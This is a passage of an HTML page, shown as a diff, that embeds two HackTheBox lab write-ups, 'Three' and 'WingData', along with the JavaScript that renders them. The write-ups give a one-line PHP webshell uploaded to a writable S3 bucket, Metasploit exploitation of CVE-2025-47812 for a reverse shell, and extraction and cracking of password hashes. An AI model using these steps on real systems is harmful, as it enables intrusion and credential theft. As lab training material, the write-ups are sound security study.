+| **Focus** | VHost enumeration, S3 bucket fingerprinting, writable bucket → PHP webshell RCE |
+
+> Educational write-up of a retired HackTheBox lab machine. Substitute your own target IP where shown.
+
+---
+
+## 1. Reconnaissance
+
+Map the host so the name-based site resolves:
+
+```bash
+sudo subl /etc/hosts        # add: <target-ip>  thetoppers.htb
+```
+
+> Editing `/etc/hosts` lets you resolve a hostname to an IP locally, so name-based virtual hosts (and the site's own links) load correctly.
+
+---
+
+## 2. Virtual Host Enumeration
+
+Fuzz for virtual hosts. `gobuster vhost` is used for subdomains (whereas `gobuster dir` is for directories). On newer Gobuster versions you must add `--append-domain` or it errors out:
+
+```bash
+gobuster vhost -u http://thetoppers.htb \
+  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt \
+  --append-domain
+```
+
+```
+s3.thetoppers.htb
+```
+
+Add the discovered subdomain to `/etc/hosts` as well:
+
+```
+<target-ip>  thetoppers.htb s3.thetoppers.htb
+```
+
+(`ffuf` would work equally well for this step.)
+
+---
+
+## 3. Fingerprinting the S3 Subdomain
+
+Look for files on the subdomain, then identify the technology:
+
+```bash
+gobuster dir -u http://s3.thetoppers.htb/ \
+  -w /usr/share/wordlists/dirb/common.txt -x php,txt
+
+nikto -host http://s3.thetoppers.htb
+```
+
+The scan reveals the subdomain is an **Amazon S3 / S3-compatible** endpoint (a local S3 service such as LocalStack). That means an AWS CLI can talk to it directly.
+
+---
+
+## 4. Accessing the Bucket
+
+Configure the AWS CLI — since this is a local/mock S3, any dummy values are accepted:
+
+```bash
+aws configure
+# AWS Access Key ID:     test
+# AWS Secret Access Key: test
+# region / output:       (anything)
+```
+
+List the bucket via the custom endpoint:
+
+```bash
+aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb
+```
+
+The objects in this bucket are the very files served by `http://thetoppers.htb` — the website is hosted out of the bucket. Crucially, the bucket is **writable**, so anything uploaded becomes web-accessible on the main site.
+
+---
+
+## 5. Webshell Upload → RCE
+
+Create a minimal PHP command webshell:
+
+```bash
+echo '<?php system($_GET["cmd"]); ?>' > shell.php
+```
+
+Upload it into the bucket:
+
+```bash
+aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb/shell.php
+```
+
+Because the bucket backs the website, the shell is now reachable on the main domain. Execute commands through the `cmd` parameter:
+
+```bash
+# list the parent directory
+http://thetoppers.htb/shell.php?cmd=ls+../
+
+# read the flag
+http://thetoppers.htb/shell.php?cmd=cat+../flag.txt
+```
+
+The flag is returned in the response.
+
+
+# HackTheBox — WingData Write-up
+
+| | |
+|---|---|
+| **Platform** | HackTheBox |
+| **Machine** | WingData |
+| **OS** | Linux |
+| **Domain** | `wingdata.htb` |
+| **Focus** | VHost discovery, Wing FTP Server RCE (CVE-2025-47812), credential extraction & cracking, sudo script privilege escalation |
+
+> Educational write-up of a HackTheBox lab machine. Substitute your own target IP and tun0 address where shown.
+
+---
+
+## 1. Reconnaissance
+
+Map the host first, then enumerate:
+
+```bash
+sudo subl /etc/hosts        # add: <target-ip>  wingdata.htb
+```
+
+Run directory and vhost discovery against the main site:
+
+```bash
+gobuster dir   -u http://wingdata.htb -w <wordlist>
+gobuster vhost -u http://wingdata.htb -w <subdomain-wordlist> --append-domain
+```
+
+The main site itself yields nothing useful directly. However, the page has a **Client Panel** link, and clicking it redirects to:
+
+```
+http://ftp.wingdata.htb
+```
+
+Add that subdomain to `/etc/hosts` as well:
+
+```
+<target-ip>  wingdata.htb ftp.wingdata.htb
+```
+
+---
+
+## 2. Fingerprinting the FTP Web Service
+
+Opening `http://ftp.wingdata.htb` reveals a **Wing FTP Server** web interface, version **7.4.3**.
+
+That version is affected by a critical vulnerability — **CVE-2025-47812**.
+
+> **CVE-2025-47812** affects Wing FTP Server versions prior to the patched release. It stems from improper handling of **NULL bytes** in the `/loginok.html` endpoint when processing the `username` parameter, allowing injection of arbitrary **Lua** code into the user session file. Successful exploitation lets an **unauthenticated** attacker execute arbitrary commands on the server — as `root` on Linux (or `NT AUTHORITY\SYSTEM` on Windows).
+
+---
+
+## 3. Foothold — Exploiting CVE-2025-47812
+
+The cleanest route is the Metasploit module for this CVE.
+
+```bash
+msfconsole
+```
+
+```
+msf6 > search cve-2025-47812
+msf6 > use <module-path-from-search>
+msf6 > set RHOSTS ftp.wingdata.htb
+msf6 > set LHOST tun0
+msf6 > set LPORT 4444
+msf6 > run
+```
+
+The exploit fires the Lua injection and returns a session.
+
+### Stabilize the shell
+
+Upgrade the basic session to an interactive TTY:
+
+```bash
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+```
+
+---
+
+## 4. Local Enumeration
+
+Inspect local accounts:
+
+```bash
+cat /etc/passwd
+```
+
+```
+wacky:x:1001:1001::/home/wacky:/bin/bash
+```
+
+The `wacky` account is the next target. Wing FTP stores its per-user configuration (including credential material) under its data directory:
+
+```bash
+cd /opt/wftpserver/Data/1/users
+ls -al
+```
+
+```
+anonymous.xml
+john.xml
+maria.xml
+steve.xml
+wacky.xml
+```
+
+Each `.xml` file holds a user's stored password hash.
+
+---
+
+## 5. Cracking the Hashes
+
+Pull the password hash out of each `*.xml` user-config file and collect them:
+
+```bash
+# copy each hash value into hashes.txt
+cat *.xml | grep -i password    # locate the hash field in each file
+```
+
+Then crack with John (or hashcat) against `rockyou`:
+
+```bash
+john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
+# or:  hashcat -m <mode> hashes.txt /usr/share/wordlists/rockyou.txt
+```
+
+This recovers a valid plaintext password (notably for `wacky`).
+
+---
+
+## 6. User Access
+
+Use the cracked credentials to log in over SSH:
+
+```bash
+ssh wacky@wingdata.htb
+```
+
+From here the **user flag** is readable in the user's home directory.
+
+---
+
+## 7. Privilege Escalation
+
+Check sudo rights:
+
+```bash
+sudo -l
+```
+
+`wacky` can run a custom binary/script as root — something under `/usr/bin/` that looks out of place. Inspect it:
+
+```bash
+cat /usr/bin/<sudo-allowed-script>
+```
+
+It turns out to be a **Python 3 script**. Review its logic for an exploitable flaw — common patterns in these custom root scripts include:
+
+- importing a module from a writable path (hijack via `PYTHONPATH` or a local module file),
+- calling out to a subprocess/command without an absolute path (`$PATH` hijack),
+- reading from or writing to an attacker-controllable file,
+- `eval`/`exec` on user-influenced input.
+
+Abuse whichever weakness the script exposes while it runs as root to obtain a root shell, after which the **root flag** is accessible.
+</script>
+
+<script>
+const LIVE = false;
+const LIVE_URLS = [
+  "https://raw.githubusercontent.com/Haemanthvj/HTB-Writeups/refs/heads/main/ARCHETYPEHTB/writeup.md",
+  "https://raw.githubusercontent.com/Haemanthvj/HTB-Writeups/refs/heads/main/CAPHTB/writeup.md",
+  "https://raw.githubusercontent.com/Haemanthvj/HTB-Writeups/refs/heads/main/FACTSHTB/writeup.md",
+  "https://raw.githubusercontent.com/Haemanthvj/HTB-Writeups/refs/heads/main/KOBOLDHTB/Writeup.md",
+  "https://raw.githubusercontent.com/Haemanthvj/HTB-Writeups/refs/heads/main/RESPONDERHTB/writeup.md",
+  "https://raw.githubusercontent.com/Haemanthvj/HTB-Writeups/refs/heads/main/THREEHTB/writeup.md",
+  "https://raw.githubusercontent.com/Haemanthvj/HTB-Writeups/refs/heads/main/WINGDATAHTB/writeup.md"
+];
+
+function slugify(t){return t.toLowerCase().replace(/[^a-z0-9]+/g,'-').replace(/(^-|-$)/g,'');}
+
+function render(md){
+  marked.setOptions({
+    breaks:true,gfm:true,
+    highlight:(code,lang)=>{
+      try{
+        if(lang && hljs.getLanguage(lang)) return hljs.highlight(code,{language:lang}).value;
+        return hljs.highlightAuto(code).value;
+      }catch(e){return code;}
+    }
+  });
+  const doc=document.getElementById('doc');
+  const loading=document.getElementById('loading');
+  const empty=document.getElementById('empty');
+  doc.innerHTML='';
+  const rendered=document.createElement('div');
+  rendered.innerHTML=marked.parse(md);
+
+  // group nodes by H1
+  const nodes=Array.from(rendered.childNodes);
+  const groups=[]; let cur=null;
+  nodes.forEach(n=>{
+    if(n.nodeType===1 && n.tagName==='H1'){ cur=[]; groups.push(cur); }
+    if(cur) cur.push(n);
+  });
+
+  const toc=document.getElementById('toc');
+  let count=0,lin=0,win=0;
+  groups.forEach(group=>{
+    const h1=group[0];
+    let title=h1.textContent.replace(/^HackTheBox\s*[—-]\s*/i,'').replace(/\s*Write-?up$/i,'').trim();
+    const id=slugify(title);
+    // pull OS + platform from the metadata table
+    let os='',sp=false;
+    const table=group.find(el=>el.nodeType===1 && el.tagName==='TABLE');
+    if(table){
+      table.querySelectorAll('tr').forEach(tr=>{
+        const c=tr.querySelectorAll('td'); if(c.length<2) return;
+        const k=c[0].textContent.trim().toLowerCase();
+        if(k==='os') os=c[1].textContent.trim();
+        if(k==='platform' && /starting point/i.test(c[1].textContent)) sp=true;
+      });
+    }
+    const osl=os.toLowerCase();
+    if(osl.includes('linux')) lin++; else if(osl.includes('windows')) win++;
+
+    // build header with OS + Starting Point pills
+    h1.textContent=title; h1.id=id;
+    if(os){
+      const pill=document.createElement('span');
+      pill.className='os-pill '+(osl.includes('windows')?'os-win':'os-lin');
+      pill.style.fontSize='12px'; pill.textContent=os;
+      h1.appendChild(pill);
+    }
+    if(sp){
+      const sptag=document.createElement('span');
+      sptag.className='os-pill'; sptag.style.cssText='color:var(--green-dim);font-size:12px';
+      sptag.textContent='STARTING POINT';
+      h1.appendChild(sptag);
+    }
+
+    const card=document.createElement('article');
+    card.className='wu'; card.id='wu-'+id; card.dataset.os=osl;
+    group.forEach(el=>card.appendChild(el));
+    doc.appendChild(card);
+    count++;
+
+    const a=document.createElement('a');
+    a.href='#'+id; a.dataset.target='wu-'+id; a.dataset.os=osl;
+    a.innerHTML=`<span>${title}</span>`+(os?`<span class="os-pill ${osl.includes('windows')?'os-win':'os-lin'}">${os.slice(0,3).toUpperCase()}</span>`:'');
+    toc.appendChild(a);
+  });
+
+  if(loading) loading.remove();
+  doc.appendChild(empty);
+  document.getElementById('stCount').textContent=String(count).padStart(2,'0');
+  document.getElementById('stLin').textContent=String(lin).padStart(2,'0');
+  document.getElementById('stWin').textContent=String(win).padStart(2,'0');
+
+  // scrollspy
+  const links=Array.from(toc.querySelectorAll('a'));
+  const spy=new IntersectionObserver((es)=>{
+    es.forEach(e=>{ if(e.isIntersecting){
+      links.forEach(l=>l.classList.toggle('active',l.dataset.target===e.target.id));
+    }});
+  },{rootMargin:'-15% 0px -75% 0px'});
+  doc.querySelectorAll('.wu').forEach(c=>spy.observe(c));
+
+  // filters
+  document.querySelectorAll('.chip').forEach(chip=>{
+    chip.addEventListener('click',()=>{
+      document.querySelectorAll('.chip').forEach(c=>c.classList.remove('active'));
+      chip.classList.add('active');
+      const f=chip.dataset.os; let visible=0;
+      doc.querySelectorAll('.wu').forEach(c=>{
+        const show=(f==='all'||c.dataset.os.includes(f));
+        c.classList.toggle('hidden',!show); if(show) visible++;
+      });
+      links.forEach(l=>l.classList.toggle('hidden',!(f==='all'||l.dataset.os.includes(f))));
+      empty.style.display=visible?'none':'block';
+    });
+  });
+}
+
+(async function(){
+  const embedded=document.getElementById('md').textContent.trim();
+  if(LIVE){
+    try{
+      const texts=await Promise.all(LIVE_URLS.map(u=>fetch(u,{cache:'no-store'}).then(r=>r.ok?r.text():'')));
+      const joined=texts.filter(Boolean).join('\n\n');
+      if(joined){ render(joined); return; }
+    }catch(e){/* fall back */}
+  }
+  render(embedded);
+})();
+</script>
+</body>
+</html>
